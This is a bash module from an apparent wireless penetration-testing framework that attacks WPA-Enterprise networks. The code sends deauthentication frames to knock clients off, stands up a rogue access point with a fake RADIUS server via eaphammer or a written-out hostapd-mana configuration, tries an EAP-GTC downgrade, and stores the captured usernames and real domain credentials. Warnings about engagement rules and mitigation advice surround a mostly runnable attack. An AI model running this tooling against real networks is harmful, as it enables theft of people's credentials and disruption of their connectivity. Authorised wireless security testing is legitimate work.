#!/usr/bin/env bash
#===============================================================================
#  modules/d5_eap_attack.sh
#  D5: WPA-Enterprise / EAP Credential Harvesting
#
#  PURPOSE:
#    Test WPA-Enterprise (802.1X) security by deploying a rogue RADIUS
#    server to capture EAP credentials. Tests client certificate validation,
#    EAP method downgrade, and identity harvesting. This is the most
#    impactful attack against enterprise WiFi networks.
#
#  TOOLS: ${TOOL_PATHS[eaphammer]}, ${TOOL_PATHS[hostapd]}-mana, ${TOOL_PATHS[tshark]}, ${TOOL_PATHS[airmon-ng]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - d5_eap_identities.txt       (harvested EAP identities/usernames)
#    - d5_credentials.txt          (captured credentials)
#    - d5_eap_types.txt            (EAP method analysis)
#    - d5_handshakes.pcap          (EAP exchange captures)
#    - d5_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - eap_type_detected: string (PEAP, EAP-TLS, EAP-TTLS, etc.)
#    - identities_captured: int
#    - credentials_captured: int
#    - cert_validation_bypass: bool
#    - eap_downgrade_possible: bool
#===============================================================================

run_d5() {
    local total_steps=8
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d5"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    
    local has_eaphammer=false
    local has_hostapd_mana=false
    local has_hostapd=false
    local has_tshark=false
    local has_aireplay=false

    command -v eaphammer &>/dev/null && has_eaphammer=true
    command -v hostapd-mana &>/dev/null && has_hostapd_mana=true
    command -v hostapd &>/dev/null && has_hostapd=true
    command -v tshark &>/dev/null && has_tshark=true
    command -v aireplay-ng &>/dev/null && has_aireplay=true

    if [[ "$has_eaphammer" == "false" && "$has_hostapd_mana" == "false" ]]; then
        log_warn "Preferred tools (${TOOL_PATHS[eaphammer]}, ${TOOL_PATHS[hostapd]}-mana) not found."
        log_warn "Will attempt passive EAP analysis only."
        if [[ "$has_tshark" == "false" ]]; then
            log_error "${TOOL_PATHS[tshark]} is required for at minimum passive EAP analysis."
            return 1
        fi
    fi

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_error "Target SSID/BSSID not set. Run A1 first."
        return 1
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"

    export EAP_ROGUE_SSID="${GUEST_SSID}"

    #--- Attack Options (Custom SSID) ---
    while true; do
        echo ""
        echo -e "${C_CYAN}┌── EAP ATTACK CONFIGURATION ──────────────────────────────────┐${C_RESET}"
        echo -e "  Target SSID: ${C_BOLD}${GUEST_SSID}${C_RESET}"
        echo -e "  Rogue SSID:  ${C_BOLD}${EAP_ROGUE_SSID}${C_RESET}"
        echo -e "  BSSID:       ${C_BOLD}${GUEST_BSSID:-unknown}${C_RESET}"
        echo -e "  Channel:     ${C_BOLD}${GUEST_CHANNEL:-auto}${C_RESET}"
        echo -e "  ${C_CYAN}├──────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}  ${C_GREEN}[T]${C_RESET} Select Target from Scan Results (A1)"
        echo -e "  ${C_CYAN}│${C_RESET}  ${C_GREEN}[S]${C_RESET} Change Rogue SSID manually"
        echo -e "  ${C_CYAN}│${C_RESET}  ${C_GREEN}[C]${C_RESET} Continue with current settings"
        echo -e "${C_CYAN}└──────────────────────────────────────────────────────────────┘${C_RESET}"
        
        get_or_request_param "eap_opt" "  Selection [C]"
        case "${eap_opt,,}" in
            t) if select_target_network; then
                   local EAP_ROGUE_SSID="${GUEST_SSID}"
               fi ;;
            s) get_or_request_param "custom_eap_ssid" "  Enter custom EAP SSID"
               EAP_ROGUE_SSID="${custom_eap_ssid:-$GUEST_SSID}" ;;
            c|"") break ;;
            *) echo -e "${C_RED}Invalid selection.${C_RESET}" ;;
        esac
    done

    # Detect if target uses WPA-Enterprise
    local target_encryption=""
    if has_tc_results "A1"; then
        local a1_data
        a1_data=$(load_tc_result "A1")
        target_encryption=$(echo "$a1_data" | ${TOOL_PATHS[jq]} -r \
            --arg bssid "$GUEST_BSSID" \
            '[.networks[] | select(.bssid == $bssid)] | .[0].encryption // ""')
    fi

    if [[ -n "$target_encryption" ]]; then
        log_info "Target encryption: ${target_encryption}"
        if ! echo "$target_encryption" | grep -qiE 'MGT|EAP|Enterprise|802.1X'; then
            log_warn "Target network does not appear to use WPA-Enterprise (detected: ${target_encryption})"
            echo ""
            get_or_request_param "proceed" "  Continue anyway? [y/N]"
            [[ "${proceed,,}" != "y" ]] && return 1
        fi
    fi

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ WPA-ENTERPRISE / EAP CREDENTIAL HARVEST ★                    ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will:                                                   ║"
    echo "  ║    • Passively capture EAP identities (usernames)                 ║"
    echo "  ║    • Deploy rogue AP with fake RADIUS to harvest credentials      ║"
    echo "  ║    • Test EAP method downgrade (GTC attack)                       ║"
    echo "  ║    • Test client certificate validation                            ║"
    echo "  ║                                                                    ║"
    echo "  ║  ⚠  Captured credentials are REAL domain credentials.            ║"
    echo "  ║  ⚠  Handle according to engagement rules.                        ║"
    echo "  ║                                                                    ║"
    echo "  ║  Requires: Second wireless adapter for rogue AP                   ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with EAP credential harvest? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local eap_type_detected=""
    local identities_captured=0
    local credentials_captured=0
    local cert_validation_bypass="false"
    local eap_downgrade_possible="false"
    local findings_file="${evidence_prefix}_findings.txt"
    local identities_file="${evidence_prefix}_eap_identities.txt"
    local credentials_file="${evidence_prefix}_credentials.txt"
    local eap_types_file="${evidence_prefix}_eap_types.txt"

    {
        echo "============================================================"
        echo "  D5: WPA-Enterprise / EAP Attack"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target SSID: ${GUEST_SSID}"
        echo "  Rogue SSID:  ${EAP_ROGUE_SSID}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    {
        echo "# EAP Identities Harvested"
        echo "# Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
    } > "$identities_file"

    {
        echo "# Captured Credentials"
        echo "# Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "# WARNING: Contains real credentials — handle per RoE"
        echo ""
    } > "$credentials_file"

    #--- Step 2: Enable monitor mode for passive capture ---
    log_step 2 $total_steps "Enabling monitor mode for passive EAP analysis"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Passive EAP identity harvesting ---
    log_step 3 $total_steps "Passive EAP identity capture (60s)"
    update_tc_progress 3 $total_steps "Identity harvest"

    check_abort || return 1

    local eap_pcap="${evidence_prefix}_handshakes.pcap"

    # Capture EAP traffic
    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$eap_pcap" \
        "ether proto 0x888e or (type mgt subtype auth) or (type mgt subtype assoc-req)" \
        &>/dev/null &
    local tcpdump_pid=$!
    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"

    # If we have aireplay, send a few deauths to trigger re-auth
    if [[ "$has_aireplay" == "true" ]]; then
        sleep 5
        log_info "Sending deauth to force EAP re-authentication..."
        ${TOOL_PATHS[aireplay-ng]} --deauth 5 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
    fi

    start_countdown 60 "Capturing EAP authentication exchanges"
    sleep 60
    stop_countdown

    
    validate_pcap "$eap_pcap" "EAP authentication exchange capture"

    # Parse EAP identities from capture
    if [[ "$has_tshark" == "true" && -f "$eap_pcap" ]]; then
        {
            echo "============================================================"
            echo "  EAP Method Analysis"
            echo "============================================================"
            echo ""
        } > "$eap_types_file"

        # Extract EAP Identity responses
        local eap_identities
        local eap_identities=$(${TOOL_PATHS[tshark]} -r "$eap_pcap" \
            -Y "eap.type == 1 && eap.code == 2" \
            -T fields \
            -e eap.identity \
            2>/dev/null | sort -u | grep -v "^$" || true)

        if [[ -n "$eap_identities" ]]; then
            local identities_captured=$(echo "$eap_identities" | wc -l)
            echo "$eap_identities" >> "$identities_file"
            log_result "FINDING" "Captured ${identities_captured} EAP identity/identities (usernames)"
            echo "FINDING: ${identities_captured} EAP identities captured:" >> "$findings_file"
            echo "$eap_identities" | sed 's/^/  /' >> "$findings_file"

            # Check for domain\ prefix patterns
            if echo "$eap_identities" | grep -qiE '\\|@'; then
                log_info "Domain usernames detected — indicates AD integration"
                echo "INFO: Domain-formatted usernames detected" >> "$findings_file"
            fi
        else
            log_info "No EAP identities captured in passive mode"
        fi

        # Detect EAP type
        local eap_types
        local eap_types=$(${TOOL_PATHS[tshark]} -r "$eap_pcap" \
            -Y "eap" \
            -T fields \
            -e eap.type \
            2>/dev/null | sort -u | grep -v "^$" || true)

        if [[ -n "$eap_types" ]]; then
            for etype in $eap_types; do
                local etype_name=""
                case "$etype" in
                    1)  etype_name="Identity" ;;
                    4)  etype_name="MD5-Challenge" ;;
                    6)  etype_name="GTC (Generic Token Card)" ;;
                    13) etype_name="EAP-TLS" ;;
                    21) etype_name="EAP-TTLS" ;;
                    25) etype_name="PEAP" ;;
                    43) etype_name="EAP-FAST" ;;
                    *)  etype_name="Type-${etype}" ;;
                esac
                echo "EAP Type ${etype}: ${etype_name}" >> "$eap_types_file"
            done

            # Determine primary auth method
            if echo "$eap_types" | grep -q "^25$"; then
                local eap_type_detected="PEAP"
            elif echo "$eap_types" | grep -q "^21$"; then
                local eap_type_detected="EAP-TTLS"
            elif echo "$eap_types" | grep -q "^13$"; then
                local eap_type_detected="EAP-TLS"
            elif echo "$eap_types" | grep -q "^43$"; then
                local eap_type_detected="EAP-FAST"
            fi

            if [[ -n "$eap_type_detected" ]]; then
                log_success "EAP type detected: ${eap_type_detected}"
                echo "Primary EAP method: ${eap_type_detected}" >> "$eap_types_file"
            fi
        fi

        # Check for cleartext EAP methods (MD5, GTC without tunnel)
        if echo "$eap_types" | grep -qE "^(4|6)$"; then
            log_result "CRITICAL" "Cleartext EAP method detected (MD5/GTC) — credentials exposed!"
            echo "CRITICAL: Cleartext EAP method in use — credentials transmitted without encryption" >> "$findings_file"
        fi
    fi

    #--- Step 4: Rogue AP with fake RADIUS (${TOOL_PATHS[eaphammer]}) ---
    log_step 4 $total_steps "Deploying rogue AP with fake RADIUS server"
    update_tc_progress 4 $total_steps "Rogue RADIUS"

    check_abort || return 1

    # Disable monitor mode — we need managed mode for rogue AP
    disable_monitor_mode
    sleep 3

    # Find secondary interface for rogue AP
    local primary_iface="${WIFI_INTERFACE:-wlan0}"
    local ap_iface=""
    local all_ifaces
    local all_ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${primary_iface}$" | grep -v "mon")

    if [[ -n "$all_ifaces" ]]; then
        local ap_iface=$(echo "$all_ifaces" | head -1)
    else
        log_warn "No secondary wireless interface — attempting with primary"
        local ap_iface="$primary_iface"
    fi

    if [[ "$has_eaphammer" == "true" ]]; then
        log_info "Using ${TOOL_PATHS[eaphammer]} for credential harvesting..."
        echo "" >> "$findings_file"
        echo "=== ${TOOL_PATHS[eaphammer]} Attack ===" >> "$findings_file"

        # Generate self-signed cert if needed
        local cert_dir="/tmp/d5_certs"
        mkdir -p "$cert_dir"

        # ${TOOL_PATHS[eaphammer]} handles cert generation internally
        # Try GTC downgrade first (captures cleartext creds)
        log_cmd "${TOOL_PATHS[eaphammer]} -i ${ap_iface} --essid '${EAP_ROGUE_SSID}' --channel ${GUEST_CHANNEL:-6} --auth wpa-eap --creds --negotiate balanced"

        local eaphammer_log="/tmp/d5_eaphammer.log"

        timeout 120 ${TOOL_PATHS[eaphammer]} \
            -i "$ap_iface" \
            --essid "$EAP_ROGUE_SSID" \
            --channel "${GUEST_CHANNEL:-6}" \
            --auth wpa-eap \
            --creds \
            --negotiate balanced \
            > "$eaphammer_log" 2>&1 &
        local eap_pid=$!
        register_cleanup "kill -TERM $eap_pid 2>/dev/null || true; sleep 0.5; kill -9 $eap_pid 2>/dev/null || true; wait $eap_pid 2>/dev/null || true"

        # Send deauth in background to force clients to reconnect to our rogue AP
        if [[ "$has_aireplay" == "true" ]]; then
            sleep 10
            # Need monitor mode on another interface for deauth
            # If we have a third interface or can temporarily enable monitor
            log_info "Waiting for clients to authenticate to rogue AP..."
        fi

        start_countdown 120 "Rogue RADIUS active — harvesting EAP credentials"
        sleep 120
        stop_countdown

        
        # Parse ${TOOL_PATHS[eaphammer]} output for creds
        if [[ -f "$eaphammer_log" ]]; then
            cat "$eaphammer_log" >> "$findings_file"

            # Look for captured credentials
            local captured_creds
            local captured_creds=$(grep -iE 'username|password|hash|credential|MSCHAP|GTC|identity' \
                "$eaphammer_log" | grep -v "^#" || true)

            if [[ -n "$captured_creds" ]]; then
                local credentials_captured=$(echo "$captured_creds" | wc -l)
                echo "$captured_creds" >> "$credentials_file"
                log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured via rogue RADIUS!"
                echo "CRITICAL: Credentials captured via ${TOOL_PATHS[eaphammer]}" >> "$findings_file"
                local cert_validation_bypass="true"
            fi

            # Check if GTC downgrade worked
            if grep -qi "GTC" "$eaphammer_log"; then
                local eap_downgrade_possible="true"
                log_result "CRITICAL" "EAP-GTC downgrade successful — plaintext credentials captured!"
                echo "CRITICAL: EAP-GTC downgrade attack successful" >> "$findings_file"
            fi
        fi

        rm -rf "$cert_dir" "$eaphammer_log"

    elif [[ "$has_hostapd_mana" == "true" ]]; then
        log_info "Using ${TOOL_PATHS[hostapd]}-mana for credential harvesting..."
        echo "" >> "$findings_file"
        echo "=== ${TOOL_PATHS[hostapd]}-mana Attack ===" >> "$findings_file"

        # Create ${TOOL_PATHS[hostapd]}-mana config
        local mana_conf="/tmp/d5_mana.conf"

        # Generate a self-signed certificate for RADIUS
        local cert_dir="/tmp/d5_certs"
        mkdir -p "$cert_dir"

        # Generate minimal cert with openssl
        openssl req -x509 -newkey rsa:2048 -keyout "${cert_dir}/server.key" \
            -out "${cert_dir}/server.pem" -days 1 -nodes \
            -subj "/CN=${EAP_ROGUE_SSID}" 2>/dev/null || true

        cat > "$mana_conf" <<MANA_EOF
interface=${ap_iface}
driver=nl80211
ssid=${EAP_ROGUE_SSID}
channel=${GUEST_CHANNEL:-6}
hw_mode=g

# WPA-Enterprise settings
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1

# EAP server
eap_server=1
eap_user_file=/tmp/d5_eap_users
ca_cert=${cert_dir}/server.pem
server_cert=${cert_dir}/server.pem
private_key=${cert_dir}/server.key

# MANA-specific: Accept all EAP identities
mana_wpe=1
mana_eapsuccess=1
mana_credout=/tmp/d5_mana_creds.txt
MANA_EOF

        # Create EAP user file
        cat > /tmp/d5_eap_users <<'EAP_EOF'
* PEAP,TTLS,TLS,GTC,MSCHAPV2
"t" TTLS-MSCHAPV2 "t" [2]
EAP_EOF

        log_cmd "${TOOL_PATHS[hostapd]}-mana ${mana_conf}"

        timeout 120 ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > /tmp/d5_mana.log 2>&1 &
        local mana_pid=$!
        register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; sleep 0.5; kill -9 $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"

        start_countdown 120 "${TOOL_PATHS[hostapd]}-mana rogue RADIUS active"
        sleep 120
        stop_countdown

        
        # Check for captured credentials
        if [[ -f /tmp/d5_mana_creds.txt && -s /tmp/d5_mana_creds.txt ]]; then
            local credentials_captured=$(wc -l < /tmp/d5_mana_creds.txt)
            cat /tmp/d5_mana_creds.txt >> "$credentials_file"
            log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured via ${TOOL_PATHS[hostapd]}-mana!"
            echo "CRITICAL: Credentials captured via ${TOOL_PATHS[hostapd]}-mana" >> "$findings_file"
            local cert_validation_bypass="true"
        fi

        if [[ -f /tmp/d5_mana.log ]]; then
            # Extract identities from mana log
            local mana_ids
            local mana_ids=$(grep -i "identity" /tmp/d5_mana.log | grep -oP "identity='[^']+'" | sort -u || true)
            if [[ -n "$mana_ids" ]]; then
                local new_ids
                local new_ids=$(echo "$mana_ids" | wc -l)
                local identities_captured=$((identities_captured + new_ids))
                echo "$mana_ids" >> "$identities_file"
            fi
        fi

        # Cleanup
        rm -rf "$cert_dir" /tmp/d5_mana* /tmp/d5_eap_users

    else
        log_info "No rogue RADIUS tool available — passive analysis only"
        echo "INFO: No EAP attack tool available (${TOOL_PATHS[eaphammer]}/hostapd-mana)" >> "$findings_file"
        echo "Passive EAP analysis completed above" >> "$findings_file"
    fi

    #--- Step 5: Restore interface ---
    log_step 5 $total_steps "Restoring interface"
    update_tc_progress 5 $total_steps "Cleanup"

    # Restore AP interface
    ${TOOL_PATHS[ip]} link set "$ap_iface" down 2>/dev/null || true
    iw dev "$ap_iface" set type managed 2>/dev/null || true
    ${TOOL_PATHS[ip]} link set "$ap_iface" up 2>/dev/null || true

    #--- Step 6: Analyze EAP security posture ---
    log_step 6 $total_steps "Analyzing EAP security posture"
    update_tc_progress 6 $total_steps "Analysis"

    check_abort || return 1

    echo "" >> "$findings_file"
    echo "=== EAP Security Analysis ===" >> "$findings_file"

    # EAP method risk assessment
    case "$eap_type_detected" in
        "PEAP")
            echo "EAP Method: PEAP (Protected EAP)" >> "$findings_file"
            echo "  Risk: Medium — inner auth (MSCHAPv2) hashes can be cracked" >> "$findings_file"
            echo "  Mitigation: Enforce certificate validation on all clients" >> "$findings_file"
            ;;
        "EAP-TTLS")
            echo "EAP Method: EAP-TTLS" >> "$findings_file"
            echo "  Risk: Medium — depends on inner auth method (PAP=high, MSCHAPv2=medium)" >> "$findings_file"
            echo "  Mitigation: Use MSCHAPv2 (not PAP) inner auth, enforce cert validation" >> "$findings_file"
            ;;
        "EAP-TLS")
            echo "EAP Method: EAP-TLS (certificate-based)" >> "$findings_file"
            echo "  Risk: Low — mutual certificate authentication" >> "$findings_file"
            echo "  Mitigation: Ensure client cert distribution is secure" >> "$findings_file"
            ;;
        "EAP-FAST")
            echo "EAP Method: EAP-FAST" >> "$findings_file"
            echo "  Risk: Medium — PAC provisioning can be attacked" >> "$findings_file"
            ;;
        "")
            echo "EAP Method: Could not be determined" >> "$findings_file"
            ;;
    esac

    #--- Step 7: Certificate analysis ---
    log_step 7 $total_steps "Analyzing RADIUS certificate (if captured)"
    update_tc_progress 7 $total_steps "Cert analysis"

    if [[ "$has_tshark" == "true" && -f "$eap_pcap" ]]; then
        # Try to extract server certificate
        local server_cert
        local server_cert=$(${TOOL_PATHS[tshark]} -r "$eap_pcap" \
            -Y "tls.handshake.certificate" \
            -T fields \
            -e x509sat.utf8String \
            2>/dev/null | head -5 || true)

        if [[ -n "$server_cert" ]]; then
            echo "" >> "$findings_file"
            echo "RADIUS Server Certificate Info:" >> "$findings_file"
            echo "$server_cert" | sed 's/^/  /' >> "$findings_file"
        fi
    fi

    #--- Step 8: Save results ---
    log_step 8 $total_steps "Saving results"
    update_tc_progress 8 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $credentials_captured -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: ${credentials_captured} credential(s) captured via rogue RADIUS server. "
        result_summary+="Clients connected to rogue AP without validating the server certificate. "
        result_summary+="${identities_captured} EAP identities harvested. EAP type: ${eap_type_detected:-unknown}."
        local recommendations="1) ENFORCE server certificate validation on ALL wireless clients (GPO/MDM). "
        recommendations+="2) Pin the RADIUS server certificate or CA in supplicant configuration. "
        recommendations+="3) Use EAP-TLS (mutual certificate auth) instead of PEAP/TTLS where possible. "
        recommendations+="4) Deploy WIDS to detect rogue RADIUS/AP attacks. "
        recommendations+="5) Monitor for anomalous 802.1X authentication patterns. "
        recommendations+="6) Consider passwordless authentication (certificate-only)."
    elif [[ "$eap_downgrade_possible" == "true" ]]; then
        local result_status="FINDING"
        local result_summary="EAP method downgrade is possible. Clients may accept weaker authentication methods (GTC) from rogue servers."
        local recommendations="1) Configure clients to only accept specific EAP methods (PEAP-MSCHAPv2 or EAP-TLS). "
        recommendations+="2) Enforce server certificate validation. "
        recommendations+="3) Disable GTC/PAP in supplicant configuration."
    elif [[ $identities_captured -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="${identities_captured} EAP identities (usernames) were harvested from wireless authentication exchanges. "
        result_summary+="No credentials captured — clients may be validating certificates correctly."
        local recommendations="1) Consider using anonymous outer identity (e.g., 'anonymous@domain') to prevent username disclosure. "
        recommendations+="2) Configure PEAP with identity privacy. "
        recommendations+="3) Monitor for unauthorized EAP identity harvesting."
    else
        local result_summary="No EAP credentials or identities were captured. "
        if [[ "$eap_type_detected" == "EAP-TLS" ]]; then
            result_summary+="Network uses EAP-TLS (certificate-based) — resistant to credential harvesting."
        else
            result_summary+="Clients appear to validate server certificates or the network may not use WPA-Enterprise."
        fi
        local recommendations="Continue using certificate-based authentication. Periodically re-test."
    fi

    local result_json
    evidence_register_file "d5_eap_identities.txt"
    evidence_register_file "d5_credentials.txt"
    evidence_register_file "d5_eap_types.txt"
    evidence_register_file "d5_handshakes.pcap"
    evidence_register_file "d5_findings.txt"

    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "EAP type: ${eap_type_detected:-unknown}, Identities: ${identities_captured}, Creds: ${credentials_captured}, Cert bypass: ${cert_validation_bypass}, Downgrade: ${eap_downgrade_possible}" \
        --arg recommendations "$recommendations" \
        --arg eap_type_detected "${eap_type_detected:-unknown}" \
        --argjson identities_captured "$identities_captured" \
        --argjson credentials_captured "$credentials_captured" \
        --arg cert_validation_bypass "$cert_validation_bypass" \
        --arg eap_downgrade_possible "$eap_downgrade_possible" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            eap_type_detected: $eap_type_detected,
            identities_captured: $identities_captured,
            credentials_captured: $credentials_captured,
            cert_validation_bypass: ($cert_validation_bypass == "true"),
            eap_downgrade_possible: ($eap_downgrade_possible == "true"),
                    }')

    save_tc_result "D5" "$result_json"

    # Display summary
    echo ""
    if [[ $credentials_captured -gt 0 ]]; then
        log_result "CRITICAL" "★ ${credentials_captured} EAP credential(s) captured — cert validation BYPASSED"
    elif [[ $identities_captured -gt 0 ]]; then
        log_result "FINDING" "${identities_captured} EAP identities harvested (usernames exposed)"
    elif [[ "$eap_type_detected" == "EAP-TLS" ]]; then
        log_result "SECURE" "EAP-TLS detected — certificate-based auth (strong)"
    else
        log_result "INFO" "EAP analysis complete — type: ${eap_type_detected:-unknown}"
    fi

    return 0
}
